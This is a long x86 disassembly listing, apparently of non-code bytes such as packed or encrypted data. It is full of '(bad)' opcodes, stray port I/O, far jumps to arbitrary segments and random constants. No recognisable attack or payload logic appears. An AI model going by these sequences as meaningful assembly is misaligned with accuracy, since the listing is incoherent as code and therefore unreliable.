  416f6e:	or     eax,0xbb5f01cd
  416f73:	xor    al,0xc6
  416f75:	lds    esi,FWORD PTR [esi+edx*8]
  416f78:	rcl    BYTE PTR ds:0x1d8bf45c,1
  416f7e:	sbb    BYTE PTR [edx-0xd299939],0x17
  416f85:	stc    
  416f86:	pop    ebx
  416f87:	inc    ebx
  416f88:	call   0xfe01:0x5df093c7
  416f8f:	(bad)  
  416f90:	pop    ss
  416f91:	push   esi
  416f92:	in     al,dx
  416f93:	and    BYTE PTR [ecx],0x49
  416f96:	push   edi
  416f97:	sbb    eax,0xa7eac1c9
  416f9c:	and    BYTE PTR [ebp-0x47],cl
  416f9f:	fs push ss
  416fa1:	rol    DWORD PTR [edx],1
  416fa3:	jbe    0x416ffc
  416fa5:	das    
  416fa6:	ror    ecx,0x4
  416fa9:	out    0xf5,eax
  416fab:	icebp  
  416fac:	push   ds
  416fad:	test   eax,0x57d3fa5b
  416fb2:	test   eax,0x4ba4a6b7
  416fb7:	mov    edi,0x84563cb5
  416fbc:	icebp  
  416fbd:	retf   0xb381
  416fc0:	jmp    0xc11a:0x6a04c860
  416fc7:	out    dx,eax
  416fc8:	pop    ecx
  416fc9:	or     BYTE PTR [ebx-0x55c0091f],dh
  416fcf:	and    BYTE PTR [eax+0x479677b8],dl
  416fd5:	jmp    0x416f8d
  416fd7:	pushf  
  416fd8:	push   esi
  416fd9:	repz mov al,ds:0x4c95d985
  416fdf:	call   0xbc8d141c
  416fe4:	and    al,0x2e
  416fe6:	mov    ebp,0xb4fd4d0a
  416feb:	mov    ebp,0xf4bbaf54
  416ff0:	mov    esi,esp
  416ff2:	push   eax
  416ff3:	into   
  416ff4:	mov    ch,0xf8
  416ff6:	sub    al,0xc8
  416ff9:	xchg   edx,eax
  416ffa:	or     al,0x6d
  416ffc:	jecxz  0x416fc5
  416ffe:	push   ebx
  416fff:	sub    esi,DWORD PTR [ebx-0x24eb3394]
  417005:	push   esi
  417006:	jmp    0x3be3e6cb
  41700b:	xchg   ebx,eax
  41700c:	je     0x416faa
  41700e:	(bad)  
  41700f:	nop
  417010:	dec    edx
  417011:	mov    ebp,0x20b645b8
  417016:	mov    ds:0x9f911265,eax
  41701b:	pop    esp
  41701c:	jne    0x416fc3
  41701e:	mov    ah,0xe1
  417020:	lds    esi,FWORD PTR [ecx-0x19af18fc]
  417026:	test   eax,0xdc891c19
  41702b:	add    dh,bh
  41702d:	stos   DWORD PTR es:[edi],eax
  41702e:	scas   eax,DWORD PTR es:[edi]
  41702f:	fadd   st(0),st
  417031:	sahf   
  417032:	cmp    eax,DWORD PTR [edx-0x64425838]
  417038:	mov    cl,0xaa
  41703a:	daa    
  41703b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41703c:	mov    bl,0xc
  41703e:	iret   
  41703f:	mov    ah,0x44
  417041:	mov    al,0x93
  417043:	inc    edx
  417044:	inc    eax
  417045:	xchg   ecx,eax
  417046:	lods   eax,DWORD PTR ds:[esi]
  417047:	xrelease xchg BYTE PTR [ebx-0x4b],al
  41704b:	(bad)  
  41704c:	xchg   esp,eax
  41704d:	fld    TBYTE PTR [ecx+0x2e022d7]
  417053:	out    0x25,al
  417055:	dec    ecx
  417056:	xchg   edx,ecx
  417058:	rcl    BYTE PTR [ecx-0x6447fd2d],1
  41705e:	pop    ebx
  41705f:	test   BYTE PTR [edi-0xfbb5c],bh
  417065:	or     eax,0xa1035e16
  41706a:	mov    cl,0xd4
  41706c:	(bad)  
  41706d:	jmp    0x55f7139c
  417072:	xchg   edx,eax
  417073:	in     eax,dx
  417074:	(bad)  
  417076:	inc    edi
  417077:	xchg   BYTE PTR ds:0x80ce5559,ah
  41707d:	dec    ecx
  41707e:	popa   
  41707f:	dec    esi
  417080:	ins    BYTE PTR es:[edi],dx
  417081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417082:	retf   
  417083:	push   ecx
  417084:	dec    esp
  417085:	cdq    
  417086:	cmp    bl,BYTE PTR ds:0x5bc9008f
  41708c:	push   ebx
  41708d:	mov    cl,0xbe
  41708f:	add    ch,BYTE PTR fs:[eax+0x5f]
  417093:	push   es
  417094:	scas   al,BYTE PTR es:[di]
  417096:	add    ch,0x82
  417099:	loope  0x41707a
  41709b:	pop    edx
  41709c:	and    edi,eax
  41709e:	jmp    0x57a77f72
  4170a3:	and    al,BYTE PTR [ecx-0x400b2deb]
  4170a9:	mov    ds:0xa2e69aa7,al
  4170ae:	pop    ebx
  4170af:	add    DWORD PTR [ecx-0x49],esp
  4170b2:	inc    esp
  4170b3:	push   0xd6315a65
  4170b8:	adc    eax,0x6924bc82
  4170bd:	jbe    0x4170f0
  4170bf:	inc    esp
  4170c0:	aad    0xa0
  4170c2:	shr    dl,1
  4170c4:	add    eax,0x5ab11123
  4170c9:	cdq    
  4170ca:	test   eax,0x9cf9d430
  4170cf:	dec    eax
  4170d0:	cld    
  4170d1:	repz mov esp,0xef8a454c
  4170d7:	cld    
  4170d8:	ret    
  4170d9:	jno    0x41705c
  4170db:	mul    BYTE PTR ds:0x81aba607
  4170e1:	cmp    BYTE PTR [ebp+0x62bd81e5],bl
  4170e7:	repz dec ecx
  4170e9:	fs sbb eax,0x4399552c
  4170ef:	jno    0x417148
  4170f1:	sbb    eax,0x6987ca4d
  4170f6:	outs   dx,BYTE PTR ds:[esi]
  4170f7:	pop    ebx
  4170f8:	mov    esp,0x3b676a88
  4170fd:	bound  edi,QWORD PTR [edx-0x7a7caa08]
  417103:	lock push edx
  417105:	sbb    al,0xfb
  417107:	mov    BYTE PTR [edi],0xaa
  41710a:	jmp    0xa5e21a29
  41710f:	jns    0x4170ba
  417111:	retf   
  417112:	pop    edi
  417113:	loopne 0x41717a
  417115:	into   
  417116:	imul   ecx
  417118:	jmp    0x41714f
  41711a:	push   ebp
  41711b:	jecxz  0x4170fd
  41711d:	stc    
  41711e:	pop    ebp
  41711f:	cmp    bl,BYTE PTR ds:0xd6557ea2
  417125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417126:	dec    ecx
  417127:	push   ss
  417128:	add    BYTE PTR [edi-0x5c6e8de7],ch
  41712e:	dec    ebp
  41712f:	pop    ds
  417130:	adc    cl,dl
  417132:	push   0xe59f8c31
  417137:	or     eax,DWORD PTR [ecx-0x13561c50]
  41713d:	mov    eax,ds:0xc1a4ebcb
  417142:	(bad)  
  417143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417144:	push   ds
  417145:	sub    DWORD PTR [edi-0x36],0x54b9eedd
  41714c:	fdiv   QWORD PTR [ebx-0x505a0f91]
  417152:	jno    0x417144
  417154:	out    0x1d,eax
  417156:	xchg   ebp,eax
  417157:	mov    ecx,0x9864da08
  41715c:	aad    0x80
  41715e:	push   es
  41715f:	inc    edx
  417160:	xchg   DWORD PTR ds:0xb9a1f3b7,ebp
  417166:	pop    ebx
  417167:	mov    edi,0xf9f32105
  41716c:	and    eax,0x23898b77
  417171:	stc    
  417172:	adc    bl,dh
  417174:	and    dl,BYTE PTR [edx-0x4a]
  417177:	push   ecx
  417178:	(bad)  
  417179:	pushf  
  41717a:	cmp    edi,DWORD PTR [ebx+0x71]
  41717d:	int    0x62
  41717f:	adc    DWORD PTR [ebx],0x50593665
  417185:	mov    esp,0xa03568ab
  41718a:	jb     0x41715a
  41718c:	mov    DWORD PTR [edx],esp
  41718e:	adc    esi,ebp
  417190:	data16 in al,dx
  417192:	rol    BYTE PTR [esi],1
  417194:	fisubr DWORD PTR [edi+0x23]
  417197:	in     eax,0x4d
  417199:	cmc    
  41719a:	jmp    0xb0b48581
  41719f:	lods   al,BYTE PTR ds:[esi]
  4171a0:	sbb    BYTE PTR [edi],dh
  4171a2:	mov    ebx,0xfd8f2664
  4171a7:	repnz test DWORD PTR [edi+ecx*8-0xca5441b],ebp
  4171af:	push   ebx
  4171b0:	push   ss
  4171b1:	cmp    DWORD PTR [edi-0xc3d0d70],ebp
  4171b7:	clc    
  4171b8:	loopne 0x417165
  4171ba:	mov    ebx,0x57e8c22b
  4171bf:	outs   dx,BYTE PTR ds:[esi]
  4171c0:	loope  0x4171a8
  4171c2:	xlat   BYTE PTR ds:[ebx]
  4171c3:	out    dx,al
  4171c4:	and    DWORD PTR [ecx-0x4a],edi
  4171c7:	push   DWORD PTR [ebx-0x4e20fb03]
  4171cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ce:	mov    edx,esp
  4171d0:	cwde   
  4171d1:	das    
  4171d2:	mov    dl,0xa9
  4171d5:	fxch   st(1)
  4171d7:	fsubr  QWORD PTR [eax-0x3c]
  4171da:	mov    eax,0x6f735f54
  4171df:	cmp    eax,DWORD PTR [ebp-0x38]
  4171e2:	mov    ebp,ebp
  4171e4:	or     BYTE PTR [ebx+edi*4-0x7366d60e],dl
  4171eb:	push   edi
  4171ec:	lock mov ecx,0xc7a45d22
  4171f2:	repz push edi
  4171f4:	lds    eax,FWORD PTR [edx]
  4171f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171f7:	in     al,dx
  4171f8:	sub    BYTE PTR [ebx+0x35],ah
  4171fb:	add    eax,0x77502952
  417200:	jnp    0x417223
  417202:	adc    edx,eax
  417204:	push   ebx
  417205:	adc    DWORD PTR [ebx+ebp*2],esi
  417208:	test   DWORD PTR [edx+0x6d],esp
  41720b:	out    0x73,al
  41720d:	int3   
  41720e:	pop    ss
  41720f:	jnp    0x417233
  417211:	adc    ah,BYTE PTR [ecx-0x7e]
  417214:	and    bl,BYTE PTR [ecx-0x198d3ce1]
  41721a:	hlt    
  41721b:	mov    ds:0x1f1b9be9,al
  417220:	ja     0x41721d
  417222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417223:	loope  0x417257
  417225:	xlat   BYTE PTR ds:[ebx]
  417226:	mov    ecx,0xce1c6769
  41722b:	in     al,0x71
  41722d:	loope  0x4171ef
  41722f:	fisttp WORD PTR [esi-0x6ffbcf99]
  417235:	mov    DWORD PTR ds:0xfea8cdcc,esp
  41723b:	in     al,dx
  41723c:	leave  
  41723d:	push   edi
  41723e:	repz sbb ah,dh
  417241:	dec    ebp
  417242:	mov    ds:0x82c99135,al
  417247:	cmc    
  417248:	sbb    ebp,DWORD PTR [edi]
  41724a:	repnz aam 0x55
  41724d:	je     0x41721d
  41724f:	out    0x8f,al
  417251:	pause  
  417253:	jnp    0x4172a8
  417255:	sub    DWORD PTR [edi],ebx
  417257:	je     0x417231
  417259:	maskmovq mm1,(bad)
  41725a:	test   DWORD PTR [ebx+0x67c47975],0xc68bccf4
  417264:	dec    ebx
  417265:	push   cs
  417266:	je     0x41723a
  417268:	popf   
  417269:	dec    eax
  41726a:	sbb    DWORD PTR [ebx+0x16bda91a],ebx
  417270:	xchg   esi,eax
  417271:	shr    ecx,cl
  417273:	pop    esi
  417274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417275:	popf   
  417276:	sti    
  417277:	imul   ebx,DWORD PTR [edi+eiz*4],0xffffffd6
  41727b:	ret    
  41727c:	imul   esp,DWORD PTR [edx+0xd],0xbc0efcc1
  417283:	adc    al,0x65
  417285:	dec    ecx
  417286:	jno    0x4172a3
  417288:	jne    0x4172c4
  41728a:	(bad)  
  41728b:	in     eax,dx
  41728c:	test   BYTE PTR [esi+0x4c],bh
  41728f:	stc    
  417290:	push   ss
  417291:	cmp    ebx,edx
  417293:	xchg   ebp,eax
  417294:	ins    BYTE PTR es:[edi],dx
  417295:	out    dx,eax
  417296:	sub    al,0x9
  417298:	mov    ds:0xede26b9d,al
  41729d:	pop    ebx
  41729e:	xchg   ecx,eax
  41729f:	aaa    
  4172a0:	aas    
  4172a1:	sbb    BYTE PTR [eax],bh
  4172a3:	jno    0x4172bf
  4172a5:	pop    ecx
  4172a6:	shl    bl,1
  4172a8:	loopne 0x41729e
  4172aa:	xchg   BYTE PTR [ecx-0x73],dh
  4172ad:	fwait
  4172ae:	stos   DWORD PTR es:[edi],eax
  4172af:	es push ebx
  4172b1:	ret    0xd333
  4172b4:	sub    al,0x24
  4172b6:	mov    ds:0xb0d72c80,eax
  4172bb:	xchg   esp,eax
  4172bc:	out    0xd7,eax
  4172be:	xchg   edi,eax
  4172bf:	nop
  4172c0:	imul   eax,DWORD PTR [edi-0x67],0xb4ccefca
  4172c7:	fmul   QWORD PTR [ecx-0x68890cbb]
  4172cd:	cmp    DWORD PTR [ebp-0x6a00d8cc],edi
  4172d3:	inc    ebp
  4172d4:	xchg   esi,eax
  4172d5:	ja     0x41730e
  4172d7:	int3   
  4172d8:	loopne 0x417274
  4172da:	test   DWORD PTR [ecx-0x3c],0x195a6963
  4172e1:	mov    ecx,0x9ff12ae6
  4172e6:	clc    
  4172e7:	dec    ebx
  4172e8:	sub    al,0x7
  4172ea:	sbb    ebx,ebx
  4172ec:	add    eax,0x5de6d9ee
  4172f1:	in     eax,0x99
  4172f3:	add    esp,DWORD PTR [eax]
  4172f5:	sub    DWORD PTR [ebx],edx
  4172f7:	jns    0x4172ae
  4172f9:	ja     0x417314
  4172fb:	test   ebx,0x4e644ba3
  417301:	mov    ch,0x75
  417303:	mov    ds:0xa2cfef8c,eax
  417308:	sub    DWORD PTR [eax-0x5b6acaa0],eax
  41730e:	mov    esp,?
  417310:	repnz mov ds:0xbaf0536b,al
  417316:	dec    ebx
  417317:	out    dx,al
  417318:	aad    0x25
  41731a:	jmp    0x41731c
  41731c:	sbb    ebx,0xffffffb6
  41731f:	xor    al,0x53
  417321:	arpl   WORD PTR [ecx],sp
  417323:	pop    ds
  417324:	cmp    DWORD PTR [eax-0x36],ebx
  417327:	sar    DWORD PTR [ecx+eax*4+0x419794b2],0x78
  41732f:	sbb    al,0xdf
  417331:	xchg   ecx,eax
  417332:	lods   al,BYTE PTR ds:[esi]
  417333:	sbb    BYTE PTR [ebp-0x17],bl
  417336:	stos   DWORD PTR es:[edi],eax
  417337:	xchg   esp,eax
  417338:	or     DWORD PTR [ebx],ebp
  41733a:	add    al,0x1d
  41733c:	retf   
  41733d:	xor    al,0xbe
  41733f:	je     0x41734d
  417341:	popf   
  417342:	fwait
  417343:	pop    ss
  417344:	and    ah,BYTE PTR [edx]
  417346:	push   cs
  417347:	sbb    ecx,DWORD PTR [edx-0x6ea9c749]
  41734d:	xchg   esp,eax
  41734e:	mov    ecx,0xcb5a3ed4
  417353:	fs cmc 
  417355:	sub    edi,DWORD PTR ds:0x94d516e5
  41735b:	in     eax,0xcc
  41735d:	dec    esp
  41735e:	nop
  41735f:	pop    ecx
  417360:	xor    DWORD PTR [esi-0x7b2f799d],esp
  417366:	popa   
  417367:	mov    esp,0xed99c497
  41736c:	mov    ebp,0x1603da02
  417371:	jp     0x417335
  417373:	pop    edi
  417374:	leave  
  417375:	popf   
  417376:	test   eax,0x7bee8fe7
  41737b:	addr16 fs int3 
  41737e:	jmp    DWORD PTR [ebp+0x55]
  417381:	inc    ecx
  417382:	push   ebx
  417384:	ret    
  417385:	scas   eax,DWORD PTR es:[edi]
  417386:	arpl   WORD PTR [ebp+0x208818e5],bp
  41738c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41738d:	xor    al,0xac
  41738f:	in     eax,dx
  417390:	out    dx,eax
  417391:	loope  0x41737e
  417393:	sub    edi,DWORD PTR [esi-0x12a214c4]
  417399:	int    0x31
  41739b:	lock xor BYTE PTR [eax-0xc49304e],0xee
  4173a3:	fsub   DWORD PTR ds:0xcbccd085
  4173a9:	pop    esp
  4173aa:	call   0xa8430448
  4173af:	push   es
  4173b0:	gs das 
  4173b2:	mov    esp,0x4d82fe98
  4173b7:	lock cmp dl,bh
  4173ba:	fstp   TBYTE PTR [edx+edi*4]
  4173bd:	outs   dx,DWORD PTR ds:[esi]
  4173be:	pop    ebp
  4173bf:	ins    DWORD PTR es:[edi],dx
  4173c0:	pop    edi
  4173c1:	sbb    DWORD PTR [edi],esi
  4173c3:	fs (bad) 
  4173c5:	cmp    eax,0xba0fa4b7
  4173ca:	lods   eax,DWORD PTR ds:[esi]
  4173cb:	or     eax,0xe50974a5
  4173d0:	outs   dx,BYTE PTR ds:[esi]
  4173d1:	call   0x3caa:0x891b10ed
  4173d8:	in     al,dx
  4173d9:	mov    bh,0xd6
  4173db:	push   ebx
  4173dc:	rcr    DWORD PTR [esi-0x6b4013e5],1
  4173e2:	and    eax,0xb6bf8b84
  4173e7:	ficom  WORD PTR [ebp+0x27]
  4173ea:	mov    dl,0x24
  4173ec:	dec    ebx
  4173ed:	add    BYTE PTR cs:[edi],cl
  4173f0:	xchg   esp,eax
  4173f1:	mov    eax,ds:0x99a084eb
  4173f6:	dec    esp
  4173f7:	jmp    0xcaee:0x5297aa10
  4173fe:	mov    dh,0x44
  417400:	jl     0x41741f
  417402:	int    0xa4
  417404:	mov    ch,0xd4
  417406:	mov    ch,0xe8
  417408:	xchg   edi,eax
  417409:	or     edx,esp
  41740b:	jnp    0x417411
  41740d:	sub    ah,BYTE PTR [eax+edi*1+0x77]
  417411:	push   edi
  417412:	push   es
  417413:	mov    eax,ds:0xe4d95c35
  417418:	jns    0x41747b
  41741a:	dec    edx
  41741b:	test   DWORD PTR [ebp+0x4],eax
  41741e:	jl     0x41740c
  417420:	imul   edx,DWORD PTR [eax],0x77
  417423:	dec    edx
  417424:	and    ch,cl
  417426:	loope  0x417461
  417428:	out    0x6b,al
  41742a:	sub    BYTE PTR [eax+0x1f],0xa8
  41742e:	jnp    0x417441
  417430:	pop    ss
  417431:	and    DWORD PTR [edi+0x1],ecx
  417434:	push   ebx
  417435:	(bad)  
  417436:	in     al,0x63
  417438:	jge    0x4173d4
  41743a:	fsub   QWORD PTR [edx+0x48]
  41743d:	imul   esi,DWORD PTR [eax],0x671fff96
  417443:	or     al,0x27
  417445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417446:	dec    ebx
  417447:	lods   al,BYTE PTR ds:[esi]
  417448:	std    
  417449:	jnp    0x417420
  41744b:	dec    eax
  41744c:	dec    esi
  41744d:	stos   DWORD PTR es:[edi],eax
  41744e:	mov    esi,fs
  417450:	in     al,dx
  417451:	pop    ds
  417452:	mov    bh,0xd4
  417454:	pop    edi
  417455:	mov    bh,0x73
  417457:	dec    esi
  417458:	lods   eax,DWORD PTR ds:[esi]
  417459:	fwait
  41745a:	sbb    esp,DWORD PTR [ecx+edi*4-0x15]
  41745e:	mov    dh,0xe0
  417460:	cmp    eax,esi
  417462:	stos   DWORD PTR es:[edi],eax
  417463:	out    0x10,eax
  417465:	cmp    DWORD PTR [esp+edx*2-0x1f671641],0xc5ee1987
  417470:	inc    ecx
  417471:	mov    ds,WORD PTR [edx]
  417473:	in     al,dx
  417474:	sbb    al,0x67
  417476:	fimul  DWORD PTR [ebp+0x46]
  417479:	(bad)  
  41747a:	mov    ebp,0x289ffce4
  41747f:	ja     0x417456
  417481:	mov    ds:0xd0bbf02f,al
  417486:	inc    edi
  417487:	loopne 0x4174a8
  417489:	cmp    DWORD PTR [ebx+0x47b30bc1],ecx
  41748f:	sahf   
  417490:	lahf   
  417491:	or     al,0x9c
  417493:	pop    ebx
  417494:	ror    DWORD PTR [eax],1
  417496:	adc    DWORD PTR ds:0x8f4ba849,esi
  41749c:	pop    edi
  41749d:	mov    esp,0x2923a6b2
  4174a2:	ret    0x87c5
  4174a5:	xchg   ebp,eax
  4174a6:	dec    edi
  4174a7:	push   es
  4174a8:	adc    al,0x69
  4174aa:	lock iret 
  4174ac:	loop   0x41744a
  4174ae:	int3   
  4174af:	js     0x41750b
  4174b1:	and    bh,cl
  4174b3:	xchg   esp,eax
  4174b4:	mov    eax,ds:0x4b86cea3
  4174b9:	sbb    DWORD PTR [ebx-0x47],esp
  4174bc:	ficomp WORD PTR [esi+0x7a]
  4174bf:	fiadd  WORD PTR [ebp-0x21]
  4174c2:	sbb    eax,0xeb73f565
  4174c7:	out    dx,eax
  4174c8:	aaa    
  4174c9:	xor    dh,ch
  4174cb:	add    DWORD PTR [edx],ebx
  4174cd:	stc    
  4174ce:	dec    BYTE PTR [ebx-0x68]
  4174d1:	mov    edx,DWORD PTR ds:0xec0cc8f4
  4174d7:	(bad)  
  4174d8:	fwait
  4174d9:	iret   
  4174da:	xchg   edx,eax
  4174db:	shl    DWORD PTR [ebx+0x70eca954],cl
  4174e1:	stos   DWORD PTR es:[edi],eax
  4174e2:	popw   ds
  4174e4:	fst    DWORD PTR [ebx]
  4174e6:	jb     0x4174d1
  4174e8:	inc    ebp
  4174e9:	cld    
  4174ea:	out    0xed,eax
  4174ec:	pop    ds
  4174ed:	push   0x6e
  4174ef:	mov    bh,0x25
  4174f1:	sub    edx,ebp
  4174f3:	pop    ebx
  4174f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f5:	iret   
  4174f6:	pop    ds
  4174f7:	lahf   
  4174f8:	mov    BYTE PTR [esi+0x1860da5b],ah
  4174fe:	sahf   
  4174ff:	cmp    cl,BYTE PTR [esi-0xb2e7394]
  417505:	mov    ds:0xdef4e4b8,eax
  41750a:	out    0xf6,eax
  41750c:	ins    DWORD PTR es:[edi],dx
  41750d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41750e:	sbb    edi,DWORD PTR [ecx]
  417510:	pop    ds
  417511:	(bad)  
  417513:	and    al,0xa
  417515:	mov    DWORD PTR [eax],esp
  417517:	daa    
  417518:	add    DWORD PTR ds:0x1ef9a4b7,esi
  41751e:	jo     0x4174a4
  417520:	xchg   ebp,eax
  417521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417522:	(bad)  
  417523:	repnz fsubr DWORD PTR [edi-0x56e78718]
  41752a:	sub    eax,ebx
  41752c:	or     al,0xef
  41752e:	sub    edx,DWORD PTR [esi+0x21fb9a69]
  417534:	mov    ebx,0xc71f9462
  417539:	adc    DWORD PTR [edi-0x4f761a8f],ebp
  41753f:	push   esp
  417540:	or     dl,al
  417542:	mov    dl,0xc3
  417544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417545:	sahf   
  417546:	fucomp st(7)
  417548:	push   edi
  417549:	test   eax,0xd922fb73
  41754e:	(bad)  
  41754f:	nop
  417550:	xchg   cx,ax
  417552:	shl    DWORD PTR [ebp-0x456461d4],cl
  417558:	lock shl BYTE PTR [eax],cl
  41755b:	sub    eax,0x968b4367
  417560:	ins    DWORD PTR es:[edi],dx
  417561:	mov    BYTE PTR gs:[esi*8+0x650043e7],0x8c
  41756a:	gs jmp 0x417507
  41756d:	cmp    eax,0x75134db6
  417572:	mov    edi,0xb03277f4
  417577:	adc    DWORD PTR ds:0x87e5d681,0x3
  41757e:	mov    ah,0x1a
  417580:	pop    ss
  417581:	dec    ecx
  417582:	pop    ecx
  417583:	add    DWORD PTR [esi-0x2d2f521f],ecx
  417589:	test   al,0x7b
  41758b:	data16 in al,dx
  41758d:	push   edi
  41758e:	out    dx,eax
  41758f:	lods   al,BYTE PTR ds:[esi]
  417590:	mov    edx,0x1c04082a
  417595:	inc    ecx
  417596:	call   0x8a0a86bf
  41759b:	xor    BYTE PTR [ebx],ah
  41759d:	jmp    0xb9ba4da0
  4175a2:	push   cs
  4175a3:	(bad)  
  4175a4:	and    al,0x9
  4175a6:	mov    edi,0xe571be0d
  4175ab:	in     al,0x3f
  4175ad:	call   0x33c6:0x9e9bc7cb
  4175b4:	jmp    0x77d7:0x35c56e54
  4175bb:	push   es
  4175bc:	inc    edi
  4175bd:	inc    ebx
  4175be:	out    dx,al
  4175bf:	mov    WORD PTR [edx+0x7c],fs
  4175c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175c3:	gs and ax,0xe80a
  4175c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175c9:	imul   ebx,DWORD PTR [ebp-0x4a167833],0xbe55987a
  4175d3:	mov    eax,0xdfaf011d
  4175d8:	es ds (bad) 
  4175db:	out    dx,al
  4175dc:	cmc    
  4175dd:	pop    ebp
  4175de:	xchg   edx,eax
  4175df:	lock rcr edi,0x7d
  4175e3:	xchg   ebp,eax
  4175e4:	sbb    eax,ebp
  4175e6:	rcr    BYTE PTR [edi+eax*2+0x48],cl
  4175ea:	(bad)  
  4175eb:	adc    al,0x10
  4175ed:	out    dx,al
  4175ee:	daa    
  4175ef:	retf   
  4175f0:	xchg   esi,eax
  4175f1:	aaa    
  4175f2:	int3   
  4175f3:	cmp    edx,DWORD PTR [ebp-0x480edc06]
  4175f9:	test   DWORD PTR [edx+0x685922dd],ebp
  4175ff:	gs jne 0x417669
  417602:	vmwrite esi,DWORD PTR es:[ebx]
  417606:	out    dx,eax
  417607:	mov    WORD PTR [ecx+ebx*1],ds
  41760a:	xchg   ebx,eax
  41760b:	aam    0x3f
  41760d:	sar    ebp,cl
  41760f:	cmp    eax,0x1b6887a4
  417614:	sbb    al,0xf
  417616:	mov    eax,0x1878c434
  41761b:	mov    esp,0xe6b10e15
  417620:	stos   BYTE PTR es:[edi],al
  417621:	jbe    0x41760a
  417623:	lods   al,BYTE PTR ds:[esi]
  417624:	mov    ecx,ebx
  417626:	ins    DWORD PTR es:[edi],dx
  417627:	das    
  417628:	push   ecx
  417629:	cwde   
  41762a:	sahf   
  41762b:	not    DWORD PTR [eax+0x55]
  41762e:	mov    al,0xf6
  417630:	xor    eax,0x24e94d11
  417635:	mov    edx,ds
  417637:	jnp    0x41765e
  417639:	or     DWORD PTR [edi+0x28],esi
  41763c:	loop   0x417683
  41763e:	fcomp  QWORD PTR [ebp-0x62]
  417641:	call   0xbd32:0x74d64e0b
  417648:	add    eax,0x2e
  41764b:	xor    BYTE PTR [esi],0x46
  41764e:	mov    ah,0x34
  417650:	dec    edi
  417651:	sub    al,0xf2
  417653:	inc    ebp
  417654:	aas    
  417655:	dec    edx
  417656:	int3   
  417657:	sbb    BYTE PTR fs:[esi],ch
  41765a:	js     0x4175ff
  41765c:	jp     0x417657
  41765e:	mov    eax,0xac5951c4
  417663:	scas   al,BYTE PTR es:[edi]
  417664:	mov    ch,dh
  417666:	inc    edi
  417667:	cli    
  417668:	frstor [edi+0x2825ef3f]
  41766e:	stos   DWORD PTR es:[edi],eax
  41766f:	clc    
  417670:	mov    cl,0xab
  417672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417673:	ret    0x649d
  417676:	out    dx,al
  417677:	out    0x34,eax
  417679:	sahf   
  41767a:	sub    al,0x34
  41767c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41767d:	xor    BYTE PTR [ecx+ebp*8+0x19809717],dl
  417684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417685:	and    BYTE PTR [ecx],0x6b
  417688:	stc    
  417689:	and    BYTE PTR [edx+0x7f8db44],dh
  41768f:	mov    dl,0xa6
  417691:	loopne 0x417618
  417693:	pop    edx
  417694:	frstor [eax-0x6caec5ad]
  41769a:	pushf  
  41769b:	(bad)  
  41769c:	adc    al,0xc4
  41769e:	dec    ebx
  41769f:	test   al,0x3c
  4176a1:	jne    0x417637
  4176a3:	repz xchg ebx,eax
  4176a5:	inc    ebp
  4176a6:	int    0xe9
  4176a8:	out    0xac,al
  4176aa:	pop    edi
  4176ab:	rcl    DWORD PTR [edi],1
  4176ad:	mov    ebx,0x7c773059
  4176b2:	mov    ecx,0xb4ee4599
  4176b7:	les    ecx,FWORD PTR [ecx]
  4176b9:	add    esp,DWORD PTR [edx-0xe]
  4176bc:	mov    ch,0x56
  4176be:	sahf   
  4176bf:	lock dec ebp
  4176c1:	sub    eax,0xf0e02595
  4176c6:	inc    esi
  4176c7:	and    ecx,DWORD PTR [ecx]
  4176c9:	std    
  4176ca:	mov    edi,0xa9cd3c94
  4176cf:	loop   0x417726
  4176d1:	dec    ecx
  4176d2:	jbe    0x4176c0
  4176d4:	and    edx,DWORD PTR [ebx]
  4176d6:	ror    cl,1
  4176d8:	pop    esp
  4176d9:	push   eax
  4176da:	mov    BYTE PTR [edx+edx*2+0x33750ef2],al
  4176e1:	in     eax,0x5a
  4176e3:	push   eax
  4176e4:	xor    BYTE PTR [edi-0x71],dl
  4176e7:	dec    ebx
  4176e8:	fsub   QWORD PTR [edi-0x5a070945]
  4176ee:	loopne 0x417729
  4176f0:	xor    esi,edi
  4176f2:	and    BYTE PTR [ebp+0x43],bl
  4176f5:	adc    bh,BYTE PTR [edi-0x3dfada8c]
  4176fb:	mov    esp,0x85e1b7e4
  417700:	pop    esp
  417701:	jbe    0x41773a
  417703:	in     eax,0xa7
  417705:	push   ebp
  417706:	fwait
  417707:	in     al,dx
  417708:	sbb    al,0x19
  41770a:	aaa    
  41770b:	xor    ebx,esi
  41770d:	shl    DWORD PTR [edx],cl
  41770f:	inc    edx
  417710:	or     BYTE PTR [ebp-0x57f5cf45],ah
  417716:	push   ecx
  417717:	call   0xd69cff03
  41771c:	call   0xd51a:0xaf4b55e
  417723:	outs   dx,BYTE PTR ds:[esi]
  417724:	test   DWORD PTR [esi-0x4da90f6c],ecx
  41772a:	test   BYTE PTR [ecx+0x22],al
  41772d:	dec    ecx
  41772e:	test   bh,dh
  417730:	sbb    DWORD PTR [ecx],edx
  417732:	inc    edi
  417733:	mov    ebx,0x9c1b9acb
  417738:	push   eax
  417739:	cmp    BYTE PTR [ecx+0x4b],dh
  41773c:	fdivr  DWORD PTR [ebx-0x43320d77]
  417742:	out    dx,al
  417743:	push   esp
  417744:	mov    dl,0xa1
  417746:	out    0x4c,al
  417748:	imul   ebx,DWORD PTR [edi-0x65],0xa979756c
  41774f:	lock xor eax,DWORD PTR [ecx+eax*1+0x72a92065]
  417757:	adc    eax,0xe43cc075
  41775c:	data16 lahf 
  41775e:	dec    ebx
  41775f:	stc    
